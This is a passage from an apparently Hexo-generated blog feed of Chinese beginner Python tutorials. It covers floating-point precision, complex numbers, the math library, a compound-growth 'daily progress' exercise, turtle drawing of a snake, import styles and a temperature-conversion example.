#9.6E5也可表示为9.6E+5</code></pre><p>浮点数类型和整数类型由计算机的不同硬件单元执行，处理方法不同。尽管浮点数0.0与整数0值相同，但在计算机内部的表示不同。</p><p>（3）Python浮点数的数值范围和小数精度受不同计算机系统的限制，sys.float_info详细列出了Python解释器所运行系统的浮点数各项参数。</p><pre><code class="python">&gt;&gt;&gt;import sys    #引入sys函数库&gt;&gt;&gt;sys.float_infosys.float_info(max=1.7976931348623157e+308, max_exp=1024, max_10_exp=308, min=2.2250738585072014e-308, min_exp=-1021, min_10_exp=-307, dig=15, mant_dig=53, epsilon=2.220446049250313e-16, radix=2, rounds=1)&#39;&#39;&#39;上述输出给出了浮点数类型所能表示的最大值(max)、最小值(min)。科学计数法表示下：基数(radix)为2时最大值的幂(max_exp)最大值的幂(max_10_exp)最小值的幂(min_10_exp)能准确计算的浮点数最大个数(dig)系数(&lt;a&gt;)的最大精度(mant_dig)计算机所能分辨的两个相邻浮点数的最小差值(epsilon)&#39;&#39;&#39;&gt;&gt;&gt;sys.float_info.max1.7976931348623157e+308</code></pre><p>（4）浮点数类型直接表示或科学计数法表示中的系数(&lt;a&gt;)最长可输出16个数字，浮点数运算结果中最长可输出17个数字。然而，根据sys.float_info结果，计算机只能提供15个数字(dig)的准确性，例如：</p><pre><code class="python">&gt;&gt;&gt;3.1415926535897924     #17个数字3.1415926535897922        #17个数字，最后一位由计算机根据二进制计算结果确定&gt;&gt;&gt; 987654321123456.789987654321123456.8</code></pre><p>（5）浮点数运算输出17个数字长度的结果，但是只有前15个数字是确定正确的，存在误差。因此浮点数无法进行高精度的数学运算，要获得高精度的运算结果，往往采用整数。使用整数表达浮点数的方法是高精度运算的基本方式之一。</p><pre><code class="python">&gt;&gt;&gt; 3.141592653*1.2345678983.8785094379864535&gt;&gt;&gt; 3141592653*12345678983878509437986453394</code></pre><p>（6）扩展：Python通过标准库decimal提供了一个更精确的数字类型Decimal，并可以使用getcontext().prec参数自定义浮点数精度的位数，例如：</p><pre><code class="python">&gt;&gt;&gt; import decimal&gt;&gt;&gt; a = decimal.Decimal(&#39;3.141592653&#39;)&gt;&gt;&gt; b = decimal.Decimal(&#39;1.234567898&#39;)&gt;&gt;&gt; decimal.getcontext().prec = 19     #自定义精度超过19位数，仍以19位数精度输出&gt;&gt;&gt; a * bDecimal(&#39;3.878509437986453394&#39;)</code></pre><h3 id="复数类型"><a href="#复数类型" class="headerlink" title="复数类型"></a>复数类型</h3><p>（1）复数可以看做是二元有序实数对(a,b)，表示为a+bj。其中，a是实数部分，简称实部；b是虚数部分，简称虚部；j表示”逆时针旋转90度”。复数是实数在二维平面空间旋转的一种表示。</p><p>（2）Python语言中，复数的虚数部分通过后缀”J”或”j”来表示，例如:</p><pre><code>12.3+4j    -5.6+7j     1.23e-4+5.67e+89j</code></pre><p>（3）复数类型中实数部分和虚数部分的数值都是浮点类型。对于复数z，可以用z.real和z.imag分别获得它的实数部分和虚数部分，例如：</p><pre><code class="python">&gt;&gt;&gt; (1.23e-4+5.67e+89j).real0.000123&gt;&gt;&gt; (1.23e-4+5.67e+89j).imag5.67e+89</code></pre><h2 id="数字类型的操作"><a href="#数字类型的操作" class="headerlink" title="数字类型的操作"></a>数字类型的操作</h2><p>Python解释器为数字类型提供数值运算操作符、数值运算函数、类型转换函数等操作方法</p><h3 id="内置的数值运算操作符"><a href="#内置的数值运算操作符" class="headerlink" title="内置的数值运算操作符"></a>内置的数值运算操作符</h3><p>(1)内置操作符(共有9个)有Python解释器直接提供，不需要引用标准或第三方函数库。</p><table><thead><tr><th align="center">操作符</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">x + y</td><td align="center">x与y之和</td></tr><tr><td align="center">x - y</td><td align="center">x与y之差</td></tr><tr><td align="center">x * y</td><td align="center">x与y之积</td></tr><tr><td align="center">x / y</td><td align="center">x与y之商</td></tr><tr><td align="center">x // y</td><td align="center">x与y之整数商，即不大于x与y之商的最大整数</td></tr><tr><td align="center">x % y</td><td align="center">x与y之商的余数，也称为模运算</td></tr><tr><td align="center">-x</td><td align="center">x的负值，即x*(-1)</td></tr><tr><td align="center">+x</td><td align="center">x本身</td></tr><tr><td align="center">x ** y</td><td align="center">x的y次幂</td></tr></tbody></table><p>(2)操作符的运算结果可能改变数字类型，所产生的的结果是”更宽”的类型，基本规则如下：</p><pre><code class="python">#整数之间运算，若数学意义上的结果是小数，结果是浮点数#整数之间运算，若数学意义上的结果是整数，结果是整数#整数和浮点数混合运算，输出结果是浮点数#整数或浮点数与复数运算，输出结果是复数&gt;&gt;&gt;100 / 333.333333333333336&gt;&gt;&gt; 100 // 333&gt;&gt;&gt; 123 + 4.0127.0&gt;&gt;&gt; 10.0 - 1 + 2j   #等价于(10.0 - 1) + 2j(9+2j)</code></pre><p>（3）增强赋值操作符(+=、-=、*=、/=、%=、**=)。若用op表示这些二元数学操作符，则下面的赋值操作等价。注意，二元操作符之间没有空格：</p><pre><code>x op= y等价于x = x op y</code></pre><h3 id="内置的数值运算函数"><a href="#内置的数值运算函数" class="headerlink" title="内置的数值运算函数"></a>内置的数值运算函数</h3><table><thead><tr><th align="center">函数</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">abs(x)</td><td align="center">x的绝对值</td></tr><tr><td align="center">divmod(x,y)</td><td align="center">(x//y,x%y)，输出为二元组形式(也称元组类型)</td></tr><tr><td align="center">pow(x,y[,z])</td><td align="center">(x**y)%z,其中参数z是可选的。使用z时，模运算与幂运算同时进行，速度很快</td></tr><tr><td align="center">round(x,[,ndigits])</td><td align="center">对x四舍五入，保留ndigits为小数。round()返回四舍五入的整数值</td></tr><tr><td align="center">max(x1,x2,…,xn)</td><td align="center">x1,x2,…,xn的最大值，n没有限定</td></tr><tr><td align="center">min(x1,x2,…,xn)</td><td align="center">x1,x2,…,xn的最小值，n没有限定</td></tr></tbody></table><p>注：abs()可以计算复数的绝对值。因此，复数的绝对值是二维坐标系中复数位置到坐标原点的长度，例如：</p><pre><code class="python">&gt;&gt;&gt;abs(-3+4j)5.0</code></pre><h3 id="内置的数字类型转换函数"><a href="#内置的数字类型转换函数" class="headerlink" title="内置的数字类型转换函数"></a>内置的数字类型转换函数</h3><p>浮点数类型转换为整数类型时，小数部分会被舍弃。复数不能直接转换为其他数字类型，可以通过.real和.imag将复数的实部或虚部分别转换。</p><table><thead><tr><th align="center">函数</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">int(x)</td><td align="center">将x转换为整数，x可以是浮点数或字符串</td></tr><tr><td align="center">float(x)</td><td align="center">将x转换为浮点数，x可以是整数或字符串</td></tr><tr><td align="center">complex(re[,im])</td><td align="center">生成一个复数，实部为re，虚部为im。re可以是整数、浮点数或字符串，im可以是整数或浮点数，但不能为字符串</td></tr></tbody></table><pre><code class="python">&gt;&gt;&gt; int(10.99)10&gt;&gt;&gt; complex(10.99)(10.99+0j)&gt;&gt;&gt; float(10 + 99j)          #复数不能直接转换，解释器会报错Traceback (most recent call last):  File &quot;&lt;pyshell#3&gt;&quot;, line 1, in &lt;module&gt;    float(10 + 99j)TypeError: can&#39;t convert complex to float&gt;&gt;&gt; float((10 + 99j).imag)     #转换后的虚数部分为9999.0</code></pre><h2 id="math库的使用"><a href="#math库的使用" class="headerlink" title="math库的使用"></a>math库的使用</h2><h3 id="math库概述"><a href="#math库概述" class="headerlink" title="math库概述"></a>math库概述</h3><p>（1）利用函数库编程是Python语言的重要特点，这些库分为Python环境中默认支持的函数库，以及第三方提供需要进行安装的函数库。其中，默认支持的函数库也叫标准函数库或内置函数库。</p><p>（2）math库是内置函数库，仅支持整数和浮点数运算，不支持复数类型。</p><p>（3）引入形式：</p><pre><code class="Python">import math                #对math库中函数采用math.&lt;b&gt;()形式使用from math import &lt;函数名&gt;   #采用&lt;函数名&gt;()形式使用from math import *         #math库中所有函数都可以采用&lt;函数名&gt;()形式使用</code></pre><h3 id="math库解析"><a href="#math库解析" class="headerlink" title="math库解析"></a>math库解析</h3><p>（1）4个数学常数</p><table><thead><tr><th align="center">常数</th><th align="center">数学表示</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">math.pi</td><td align="center">π</td><td align="center">圆周率，值为3.141 592 653 589 793</td></tr><tr><td align="center">math.e</td><td align="center">e</td><td align="center">自然对数，值为2.718 281 828 459 045</td></tr><tr><td align="center">math.inf</td><td align="center">∞</td><td align="center">正无穷大，负无穷大为-math.inf</td></tr><tr><td align="center">math.nan</td><td align="center"></td><td align="center">非浮点数标记，NaN(not a number)</td></tr></tbody></table><p>（2）16个数值表示函数，这里只列出比较常用的</p><table><thead><tr><th align="center">函数</th><th align="center">数学表示</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">math.fabs(x)</td><td align="center">|x|</td><td align="center">返回x的绝对值</td></tr><tr><td align="center">math.fmod(x)</td><td align="center">x%y</td><td align="center">返回x与y的模</td></tr><tr><td align="center">math.fsum([x,y,…])</td><td align="center">x+y+…</td><td align="center">浮点数精确求和</td></tr><tr><td align="center">math.ceil(x)</td><td align="center"></td><td align="center">向上取整，返回不小于x的最小整数</td></tr><tr><td align="center">math.floor(x)</td><td align="center"></td><td align="center">向下取整，返回不大于x的最大整数</td></tr><tr><td align="center">math.factorial(x)</td><td align="center">x!</td><td align="center">返回x的阶乘，若x为小数或负数，返回ValueError</td></tr><tr><td align="center">math.gcd(a,b)</td><td align="center"></td><td align="center">返回a与b的最大公约数</td></tr><tr><td align="center">math.modf(x)</td><td align="center"></td><td align="center">返回x的小数和整数部分</td></tr><tr><td align="center">math.trunc(x)</td><td align="center"></td><td align="center">返回x的整数部分</td></tr><tr><td align="center">math.isclose(a,b)</td><td align="center"></td><td align="center">比较a和b的相似性，返回True或False</td></tr></tbody></table><pre><code class="python">&gt;&gt;&gt; 0.1 + 0.2 + 0.30.6000000000000001&gt;&gt;&gt; import math&gt;&gt;&gt; math.fsum([0.1, 0.2, 0.3])0.6</code></pre><p>在涉及浮点数运算及结果比较时，建议采用math库提供的函数，而不直接使用Python提供的运算符，以避免精度尾数带来的影响</p><p>（3）8个幂对函数</p><table><thead><tr><th align="center">函数</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">math.pow(x,y)</td><td align="center">返回x的y次幂</td></tr><tr><td align="center">math.exp(x)</td><td align="center">返回e的x次幂，e是自然对数</td></tr><tr><td align="center">math.sqrt(x)</td><td align="center">返回x的平方根</td></tr><tr><td align="center">math.log(x[,base])</td><td align="center">返回x的对数值，只输入x时，底数为e，即lnx</td></tr><tr><td align="center">math.log2(x)</td><td align="center">返回x的2对数值</td></tr><tr><td align="center">math.log10(x)</td><td align="center">返回x的10对数值</td></tr><tr><td align="center">math.log1p(x)</td><td align="center">返回1+x的自然对数值，ln(1+x)</td></tr><tr><td align="center">math.expml(x)</td><td align="center">返回e的x次幂减1</td></tr></tbody></table><pre><code class="python">&gt;&gt;&gt;math.pow(10, 1/3)2.154434690031884</code></pre><p>（4）16个三角运算函数，这里只列出部分函数</p><table><thead><tr><th align="center">函数</th><th align="center">数学表示</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">math.degrees(x)</td><td align="center"></td><td align="center">角度x的弧度值转角度值</td></tr><tr><td align="center">math.radians(x)</td><td align="center"></td><td align="center">角度x的角度值转弧度值</td></tr><tr><td align="center">math.hypot(x,y)</td><td align="center"></td><td align="center">返回(x,y)坐标到原点(0,0)的距离，联想勾股定理</td></tr><tr><td align="center">math.sin(x)</td><td align="center">sinx</td><td align="center">返回x的正弦函数值，x是弧度值</td></tr><tr><td align="center">math.cos(x)</td><td align="center">cosx</td><td align="center">返回x的余弦函数值，x是弧度值</td></tr><tr><td align="center">math.tan(x)</td><td align="center">tanx</td><td align="center">返回x的正切函数值，x是弧度值</td></tr><tr><td align="center">math.asin(x)</td><td align="center">arcsinx</td><td align="center">返回x的反正弦函数值，x是弧度值</td></tr><tr><td align="center">math.acos(x)</td><td align="center">arccosx</td><td align="center">返回x的反余弦函数值，x是弧度值</td></tr><tr><td align="center">math.atan(x)</td><td align="center">arctanx</td><td align="center">返回x的反正切函数值，x是弧度值</td></tr></tbody></table><pre><code class="python">&gt;&gt;&gt; math.atan(1)*4      #arctan1的值是π/43.141592653589793</code></pre><h2 id="天天向上的力量"><a href="#天天向上的力量" class="headerlink" title="天天向上的力量"></a>天天向上的力量</h2><p>（1）一年365天，初始能力值为1.0，好好学习相比前一天提高0.1%，没有学习则相比前一天下降0.1%。分别计算一年下来，每天努力和每天放任的能力值。天天向上的力量是(1+0.001)的365次方，放任的力量是(1-0.001)的365次方。</p><pre><code class="Python">import mathdayup = math.pow((1.0 + 0.001), 365)   #提高0.1%daydown = math.pow((1.0-0.001), 365)   #放任0.1%print(&quot;向上：&#123;:.2f&#125;，向下：&#123;:.2f&#125;。&quot;.format(dayup, daydown))</code></pre><pre><code class="python">&gt;&gt;&gt;向上：1.44，向下：0.69。</code></pre><p>可见，每天提高0.1%，一年将提高44%。</p><p>（2）若学习时每天提高0.5%，放任时下降0.5%。</p><pre><code class="python">import mathdayup = math.pow((1.0 + 0.005), 365)   #提高0.5%daydown = math.pow((1.0-0.005), 365)   #放任0.5%print(&quot;向上：&#123;:.2f&#125;，向下：&#123;:.2f&#125;。&quot;.format(dayup, daydown))</code></pre><pre><code class="python">&gt;&gt;&gt;向上：6.17，向下：0.16。</code></pre><p>每天努力0.5%，一年将提高6倍。</p><p>（3）上面的两个代码中，0.1%、0.5%，这个每天努力的因素根据需求的不同而不断变化。因此，可以用一个变量dayfactor来表示，这样每次只需要修改这个变量值即可。新代码如下：</p><pre><code class="python">import mathdayfactor = 0.01dayup = math.pow((1.0 + dayfactor), 365)     #提高1%daydown = math.pow((1.0-dayfactor), 365)     #放任1%print(&quot;向上：&#123;:.2f&#125;，向下：&#123;:.2f&#125;。&quot;.format(dayup, daydown))</code></pre><pre><code class="python">&gt;&gt;&gt;向上：37.78，向下：0.03。</code></pre><p>每天努力1%，一年将提高37倍。</p><p>（4）每天努力提高1%，放任下降1%。一周努力5天，放任2天。</p><pre><code class="python">dayup, dayfactor = 1.0, 0.01for i in range(365):    if (i % 7) in [6, 0]:        dayup = dayup * (1 - dayfactor)    else:        dayup = dayup * (1 + dayfactor)print(&quot;向上5天向下2天的力量：&#123;:.2f&#125;。&quot;.format(dayup))</code></pre><pre><code class="python">&gt;&gt;&gt;向上5天向下2天的力量：4.63。</code></pre><p>可得，每周努力5天，休息2天，一年仅提高4倍，比起每天坚持所提高的37倍相去甚远。</p><p>（5）同样每周努力5天，休息2天，那么每天需要努力多少才能与天天学习的效果一样。</p><pre><code class="python">def dayUP(df):    dayup = 1.0    for i in range(365):        if (i % 7) in [6, 0]:            dayup = dayup * (1-0.01)        else:            dayup = dayup * (1+df)    return dayup                   #保留字return返回dayUP()的运行结果dayfactor = 0.01while (dayUP(dayfactor) &lt; 37.78):    dayfactor += 0.001print(&quot;每天的努力参数是：&#123;:.3f&#125;。&quot;.format(dayfactor))</code></pre><pre><code class="python">&gt;&gt;&gt;每天的努力参数是：0.019。</code></pre><p>所以每天要努力1.9%才能达到和天天坚持一样的效果。这就是天天向上的力量！</p><p><strong>学习如逆水行舟，不进则退。</strong></p>]]></content>
      
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>初识Python语言(三)</title>
      <link href="2020/11/26/Python/%E5%88%9D%E8%AF%86Python%E8%AF%AD%E8%A8%80(%E4%B8%89)/"/>
      <url>2020/11/26/Python/%E5%88%9D%E8%AF%86Python%E8%AF%AD%E8%A8%80(%E4%B8%89)/</url>
      
        <content type="html"><![CDATA[<h2 id="实例2：Python蟒蛇绘制"><a href="#实例2：Python蟒蛇绘制" class="headerlink" title="实例2：Python蟒蛇绘制"></a>实例2：Python蟒蛇绘制</h2><pre><code class="python">import turtleturtle.setup(650, 350, 200, 200)turtle.penup()turtle.fd(-250)turtle.pendown()turtle.pensize(25)turtle.pencolor(&quot;purple&quot;)turtle.seth(-40)for i in range(4):    turtle.circle(40, 80)    turtle.circle(-40, 80)turtle.circle(40, 80/2)turtle.fd(40)turtle.circle(16, 180)turtle.fd(40 * 2/3)</code></pre><p>输出效果：</p><p><img src="https://i.loli.net/2020/11/26/jpJvVGNhOBQ2nFc.png" alt="image-20201126222735656"></p><p>（1）实例2中绝大多数的代码都是&lt;a&gt;.&lt;b&gt;()的形式，这是Python的一种典型表达式。它可以表示调用一个对象&lt;a&gt;的方法&lt;b&gt;，也可以表示调用一个函数库&lt;a&gt;中的函数&lt;b&gt;()。实例2中使用了用于绘制图形的turtle库，并通过保留字import引用这个函数库。</p><p>（2）实例2中通过使用函数库并利用库中函数进行编程的方法，称为“模块编程”。</p><h3 id="import对库的引用"><a href="#import对库的引用" class="headerlink" title="import对库的引用"></a>import对库的引用</h3><p>使用import引用函数库有两种方式。</p><p>（1）第一种：</p><pre><code class="python">import &lt;库名&gt;</code></pre><p>此时，可以调用库名中的所有函数，使用库中函数格式如下：</p><pre><code>&lt;库名&gt;.&lt;函数名&gt;(&lt;函数参数&gt;)</code></pre><p>（2）第二种：</p><pre><code class="python">from &lt;库名&gt; import &lt;函数名,函数名,...,函数名&gt;from &lt;库名&gt; import *          #其中，*是通配符，表示所有函数</code></pre><p>此时，调用该库的函数时不再需要使用库名，直接使用如下格式：</p><pre><code>&lt;函数名&gt;(&lt;函数参数&gt;)</code></pre><p>使用第二种库引用方式修改实例2代码，如下：</p><pre><code class="python">from turtle import *       &#39;&#39;&#39;第一条语句也可用如下两条语句代替:from turtle import setup, penup, fd, pendowfrom turtle import pensize, pencolor, seth, circle&#39;&#39;&#39;setup(650, 350, 200, 200)penup()fd(-250)pendown()pensize(25)pencolor(&quot;purple&quot;)seth(-40)for i in range(4):    circle(40, 80)    circle(-40, 80)circle(40, 80/2)fd(40)circle(16, 180)fd(40 * 2/3)</code></pre><table><thead><tr><th align="left">import引用库方法</th><th align="left">优点</th></tr></thead><tbody><tr><td align="left">第一种</td><td align="left">能够显示标明函数来源，在引用较多库时代码的可读性更好</td></tr><tr><td align="left">第二种</td><td align="left">利用保留字直接引用库中函数，使代码更简洁，在引用较少库的情况下效果更佳</td></tr></tbody></table><p>（3）注意事项：第一种引用方式，Python解释器将&lt;a&gt;.&lt;b&gt;整体作为函数名。第二种引用方式，解释器将&lt;b&gt;作为函数名，因此第二种引用方式可能会出现：用户自定义的函数名&lt;b&gt;与库中的函数名&lt;b&gt;冲突的情况。</p><h2 id="turtle库语法元素分析"><a href="#turtle库语法元素分析" class="headerlink" title="turtle库语法元素分析"></a>turtle库语法元素分析</h2><p>Python的turtle库是一个直观有趣的图形绘制函数库</p><h3 id="绘图坐标体系"><a href="#绘图坐标体系" class="headerlink" title="绘图坐标体系"></a>绘图坐标体系</h3><p>（1）turtle库绘制图形有一个基本框架：一个小海龟在坐标系中爬行，其爬行轨迹形成了绘制图形。</p><p>（2）刚开始绘制时，小海龟位于画布正中央，坐标为(0,0)，行进方向为水平右方。</p><p><img src="https://i.loli.net/2020/11/27/ulH8p5UXdWftGKx.png" alt="image-20201127105742159"></p><p>（3）实例2中使用了turtle.setup()函数，其作用是设置主窗体的大小和位置，具体定义如下：</p><pre><code>turtle.setup(width, height, startx, starty)</code></pre><table><thead><tr><th>参数</th><th>含义</th></tr></thead><tbody><tr><td>width</td><td>窗口宽度。若是整数，表示像素值；若是小数，表示窗口宽度与屏幕的比例</td></tr><tr><td>height</td><td>窗口高度。若是整数，表示像素值；若是小数，表示窗口高度与屏幕的比例</td></tr><tr><td>startx</td><td>窗口左侧与屏幕左侧的像素距离。如果值是None，窗口位于屏幕水平中央</td></tr><tr><td>starty</td><td>窗口顶部与屏幕顶部的像素距离。如果值是None，窗口位于屏幕垂直中央</td></tr></tbody></table><h3 id="画笔控制函数"><a href="#画笔控制函数" class="headerlink" title="画笔控制函数"></a>画笔控制函数</h3><h4 id="turtle-penup-和turtle-pendown-函数"><a href="#turtle-penup-和turtle-pendown-函数" class="headerlink" title="turtle.penup()和turtle.pendown()函数"></a>turtle.penup()和turtle.pendown()函数</h4><p>turtle中的画笔(即小海龟)可以通过一组函数来控制，实例2中的penup()和pendown()函数是一组，它们分别表示抬起画笔和落下画笔。</p><table><thead><tr><th>函数</th><th>别名</th><th>作用</th><th>参数</th></tr></thead><tbody><tr><td>turtle.penup()</td><td>turtle.pu()，turtle.up()</td><td>抬起画笔，之后移动画笔不绘制形状</td><td>无</td></tr><tr><td>turtle.pendown()</td><td>turtle.pd()，turtle.down()</td><td>落下画笔，之后移动画笔将绘制形状</td><td>无</td></tr></tbody></table><h4 id="turtle-pensize-函数"><a href="#turtle-pensize-函数" class="headerlink" title="turtle.pensize()函数"></a>turtle.pensize()函数</h4><p>用来设置画笔尺寸。</p><pre><code>定义：turtle.pensize(width)别名：turtle.width()作用：设置画笔宽度，当无参数输入时返回当前画笔宽度参数如下#width。设置的画笔线条宽度，如果为None或者为空，则函数返回当前画笔宽度</code></pre><h4 id="turtle-pencolor-函数"><a href="#turtle-pencolor-函数" class="headerlink" title="turtle.pencolor()函数"></a>turtle.pencolor()函数</h4><p>用来给画笔设置颜色。</p><pre><code>定义：turtle.pencolor(colorstring)或turtle.pencolor((r,g,b))作用：设置画笔颜色，当无参数输入时返回当前画笔颜色参数如下：#colorstring：表示颜色的字符串，例如：“purple”、”red“、”blue“等#(r,g,b)：颜色对应的RGB数值，例如：(51,204,140)</code></pre><p>很多RGB颜色都有固定的英文名字，这些英文名字可以作为colorstring输入，也可采用(r,g,b)形式直接输入。</p><table><thead><tr><th align="center">英文名称</th><th align="center">RGB</th><th align="center">中文名称</th></tr></thead><tbody><tr><td align="center">white</td><td align="center">255 255 255</td><td align="center">白色</td></tr><tr><td align="center">black</td><td align="center">0 0 0</td><td align="center">黑色</td></tr><tr><td align="center">grey</td><td align="center">190 190 190</td><td align="center">灰色</td></tr><tr><td align="center">darkgreen</td><td align="center">0 100 0</td><td align="center">深绿色</td></tr><tr><td align="center">gold</td><td align="center">255 215 0</td><td align="center">金色</td></tr><tr><td align="center">violet</td><td align="center">238 130 238</td><td align="center">紫罗兰</td></tr><tr><td align="center">purple</td><td align="center">160 32 240</td><td align="center">紫色</td></tr></tbody></table><h3 id="形状绘制函数"><a href="#形状绘制函数" class="headerlink" title="形状绘制函数"></a>形状绘制函数</h3><h4 id="turtle-fd-函数"><a href="#turtle-fd-函数" class="headerlink" title="turtle.fd()函数"></a>turtle.fd()函数</h4><p>用来控制画笔向当前行进方向前进一个距离。</p><pre><code>定义：turtle.fd(distance)别名：turtle.forward(distance)作用：向小海龟当前行进方向前进distance距离参数如下：#distance：行进距离的像素值，当值为负数时，表示向相反方向前进</code></pre><h4 id="turtle-seth-函数"><a href="#turtle-seth-函数" class="headerlink" title="turtle.seth()函数"></a>turtle.seth()函数</h4><p>用来改变画笔绘制方向。</p><pre><code>定义：turtle.seth(to_angle)别名：turtle.setheading(to_angle)作用：设置小海龟当前行进方向为to_angle,该角度是绝对方向角度值参数如下：#to_angle：角度的整数值</code></pre><p><img src="https://i.loli.net/2020/11/27/VduCgIDaJ9A81ly.png" alt="image-20201127124608385"></p><p>注意：turtle库的角度坐标体系以正东向为绝对0度，这也是小海龟初始爬行方向。正西向为绝对180度。上图的方向坐标体系是方向的绝对方向体系，与小海龟爬向当前方向无关。</p><h4 id="turtle-goto-函数"><a href="#turtle-goto-函数" class="headerlink" title="turtle.goto()函数"></a>turtle.goto()函数</h4><p>可以使用turtle.goto(x,y)方法来让小海龟沿着绝对坐标进行运动，且不打印其爬行轨迹。</p><p>以屏幕中间为原点(0,0)，形成四象限的坐标体系。</p><p><img src="https://i.loli.net/2020/11/27/NdikQ41ZT9EzMFc.png" alt="image-20201127164623691"></p><pre><code class="Python">turtle.goto(0,300)  #x为0,y为300,代表中心向上移动300turtle.goto(-100,-100)  #x为-100，代表向左移动100；y为-100，代表向下移动100</code></pre><h4 id="for循环语句"><a href="#for循环语句" class="headerlink" title="for循环语句"></a>for循环语句</h4><p>由保留字for引导的循环称为”遍历循环“，for语句的循环格式如下：</p><pre><code class="python">for i in range(&lt;循环次数&gt;)    &lt;语句块1&gt;</code></pre><p>例如实例2中的for循环表示循环内部的两个语句块连续执行4次：</p><pre><code class="python">for i in range(4):    turtle.circle(40, 80)    turtle.circle(-40, 80)</code></pre><h4 id="turtle-circle-函数"><a href="#turtle-circle-函数" class="headerlink" title="turtle.circle()函数"></a>turtle.circle()函数</h4><p>用来绘制一个弧形。</p><pre><code>定义：turtle.circle(radius, extent=None)作用：根据半径radius绘制extent角度的弧形参数如下：#radius：弧形半径，当值为正数时，半径在小海龟左侧(逆时针)；当值为负数时，半径在小海龟右侧(顺时针)#extent：绘制弧形的角度，当不设置参数或参数设置为None时，绘制整个圆形</code></pre><p><img src="https://i.loli.net/2020/11/27/uprBWaQxZbXdn8i.png" alt="image-20201127132201550"></p><p><img src="https://i.loli.net/2020/11/27/InHJazGQuSZW1Ms.png" alt="image-20201127133023244"></p><h3 id="函数的封装"><a href="#函数的封装" class="headerlink" title="函数的封装"></a>函数的封装</h3><p>实例2中的程序代码功能可以分为两类。一类是绘制图形前对画笔的设置，包括颜色、尺寸、初始位置等；另一类则是绘制Python蟒蛇的功能。因此，可以通过保留字def定义一个drawSnake()函数，将蟒蛇的绘制这个独立功能封装起来。代码如下：</p><pre><code class="python">import turtledef drawSnake(radius, angle, length):    turtle.seth(-40)    for i in range(length):        turtle.circle(radius, angle)        turtle.circle(-radius, angle)    turtle.circle(radius, angle/2)    turtle.fd(40)    turtle.circle(16, 180)    turtle.fd(40 * 2/3)turtle.setup(650, 350, 200, 200)turtle.penup()turtle.fd(-250)turtle.pendown()turtle.pensize(25)turtle.pencolor(&quot;purple&quot;)drawSnake(40, 80, 4)turtle.done()</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>初识Python语言(二)</title>
      <link href="2020/11/26/Python/%E5%88%9D%E8%AF%86Python%E8%AF%AD%E8%A8%80(%E4%BA%8C)/"/>
      <url>2020/11/26/Python/%E5%88%9D%E8%AF%86Python%E8%AF%AD%E8%A8%80(%E4%BA%8C)/</url>
      
        <content type="html"><![CDATA[<h2 id="实例1：温度转换"><a href="#实例1：温度转换" class="headerlink" title="实例1：温度转换"></a>实例1：温度转换</h2><pre><code class="python">&#39;&#39;&#39;转换算法：C = (F-32)/1.8F = C*1.8 + 32&#39;&#39;&#39;TempStr = input(&quot;请输入带有符号的温度值：&quot;)if TempStr[-1] in [&#39;F&#39;,&#39;f&#39;]:    C = (eval(TempStr[0:-1]) - 32)/1.8    print(&quot;转换后的温度是&#123;:.2f&#125;C&quot;.format(C))elif TempStr[-1] in [&#39;C&#39;,&#39;c&#39;]:    F = 1.8*eval(TempStr[0:-1]) + 32    print(&quot;转换后的温度是&#123;:.2f&#125;F&quot;.format(F))else:    print(&quot;输入格式错误&quot;)</code></pre><p>运行结果：</p><p><img src="https://i.loli.net/2020/11/26/Vgm1Xz6Nl8yWD79.png" alt="image-20201126115434716"></p><h2 id="Python程序语法元素分析"><a href="#Python程序语法元素分析" class="headerlink" title="Python程序语法元素分析"></a>Python程序语法元素分析</h2><h3 id="程序的格式框架"><a href="#程序的格式框架" class="headerlink" title="程序的格式框架"></a>程序的格式框架</h3><p>（1）Python语言用严格的“缩进”来表明程序的格式框架。每行代码前的空白区域即是缩进，用来表示代码之间的包含和层次关系。</p><p>（2）缩进常用Tab键实现，也可用多个空格实现，通常是4个空格。缩进还包括单层缩进和经过嵌套形成的多层缩进。</p><p>（3）一般来说，判断、循环、函数、类等语法形式能够通过缩进包含一批代码。</p><p>（4）Python语法允许在表达式内部标记之间增加空格，这样有助于提高代码的可读性，但不能改变与缩进相关的空格数量，也不能在变量名中间增加空格。</p><h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><p>Python语言有两种方法：单行注释和多行注释。单行注释以#开头，多行注释则以’’’(3个单引号)开头和结尾。例如:</p><pre><code class="python">&#39;&#39;&#39;转换算法：C = (F-32)/1.8F = C*1.8 + 32&#39;&#39;&#39;</code></pre><h3 id="命名与保留字"><a href="#命名与保留字" class="headerlink" title="命名与保留字"></a>命名与保留字</h3><p>（1）Python语言采用大小写字母、数字、下划线和汉字等字符及其组合给变量命名，但首字符不能为数字，且中间不能出现空格，长度没有限制。注意：标识符对大小写敏感。</p><p>（2）保留字（Keyword），也称为关键字，不能用来给变量命名。Python3.x版本共有33个保留字，保留字同样对大小写敏感，例如for是保留字，而For则不是。</p><h3 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h3><p>（1）Python语言中，字符串是用两个双引号””或者单引号’’括起来的零个或多个字符。</p><p>（2）字符串是字符的序列，可以按照单个字符或字符片段进行索引。字符串包括两种序号体系：正向递增序号和反向递减序号。二者可以混合使用，若字符串长度为L，则从左到右，正向递增序号为0~L-1;反向递减序号为-L~-1</p><p><img src="https://i.loli.net/2020/11/26/xe7X9WBL5aGA4jI.png" alt="image-20201126163416661"></p><p>（3）Python字符串也提供区间访问方式，采用[N:M]格式，表示字符串从N到M(不包含M)的子字符串，其中N和M都是字符串的索引序号。</p><pre><code class="python">TempStr = &quot;110C&quot;print(TempStr[-1])          #只打印最后一个字符，即&#39;C&#39;print(TempStr[0:2])         #打印第一第二个字符，即&#39;11&#39;print(TempStr[0:-1])        #打印除去最后一个字符的字符串,即&#39;110&#39;;效果和TempStr[0:3]一样print(TempStr[:])           #打印全部字符</code></pre><h3 id="赋值语句"><a href="#赋值语句" class="headerlink" 